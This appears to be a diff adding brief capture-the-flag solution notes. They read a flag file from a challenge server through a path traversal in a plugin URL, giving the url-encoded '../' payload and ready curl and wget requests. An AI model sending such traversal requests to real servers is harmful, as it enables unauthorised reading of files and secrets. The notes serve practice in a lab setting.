@@ -1,0 +1,16 @@
+http://<CHALLENGE_SERVER_IP>:8895
+
+
+http://<CHALLENGE_SERVER_IP>:8895/public/plugins/alertlist/
+url encode file path: ../../../../../../../../secret/flag.txt
+result : %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fsecret%2Fflag%2Etxt
+
+http://<CHALLENGE_SERVER_IP>:8895/public/plugins/alertlist/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fsecret%2Fflag%2Etxt
+
+
+
+use browser http://<CHALLENGE_SERVER_IP>:8895/public/plugins/alertlist/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fsecret%2Fflag%2Etxt
+curl http://<CHALLENGE_SERVER_IP>:8895/public/plugins/alertlist/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fsecret%2Fflag%2Etxt
+wget http://<CHALLENGE_SERVER_IP>:8895/public/plugins/alertlist/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fsecret%2Fflag%2Etxt -O flag.txt
+
+-O flag.txt just saves it to the named file instead of "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fsecret%2Fflag.txt"
